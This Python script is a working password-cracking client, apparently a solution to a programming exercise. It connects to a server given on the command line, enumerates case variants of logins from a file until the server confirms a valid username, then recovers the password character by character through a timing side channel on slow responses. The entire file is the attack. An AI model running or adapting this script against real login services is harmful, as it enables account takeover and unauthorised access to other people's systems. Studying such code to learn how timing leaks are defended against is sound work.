from sys import argv
from socket import socket
from itertools import product
from string import ascii_letters, digits
from json import dumps, loads
from datetime import datetime, timedelta


user_input = argv
search = {"login": "", "password": ""}


def generate_password():
    chars = ascii_letters + digits
    n = 1
    i = 1
    while i <= 1000000:
        for x in product(chars, repeat=n):
            yield x
            i += 1
        n += 1


def all_cases(dline):
    yield map(''.join, product(*zip(dline.strip().upper(), dline.strip().lower())))


def try_data(password=' '):
    try:
        data = dumps({"login": search['login'], "password": password})
        conn.send(data.encode())
        start = datetime.now()
        answer = conn.recv(1024).decode()
        stop = datetime.now()
        if (stop - start) > timedelta(milliseconds=1):
            return dumps({"result": "Exception happened during login"})
        else:
            return answer
    except ConnectionAbortedError:
        pass


with socket() as conn:
    server_address = (user_input[1], int(user_input[2]))
    conn.connect(server_address)

    with open('logins.txt') as logins:
        ok = False
        for line in logins.readlines():
            result = next(all_cases(line))
            for r in result:
                search['login'] = r
                message = loads(try_data())
                if message['result'] == 'Wrong password!':
                    ok = True
                    break
            if ok:
                break

    ok = False
    while True:
        for char in ascii_letters + digits:
            test_password = search['password'] + char
            message = loads(try_data(test_password))
            if message['result'] == 'Exception happened during login':
                search['password'] += char
            elif message['result'] == 'Connection success!':
                search['password'] += char
                ok = True
                break
        if ok:
            break

print(dumps(search))
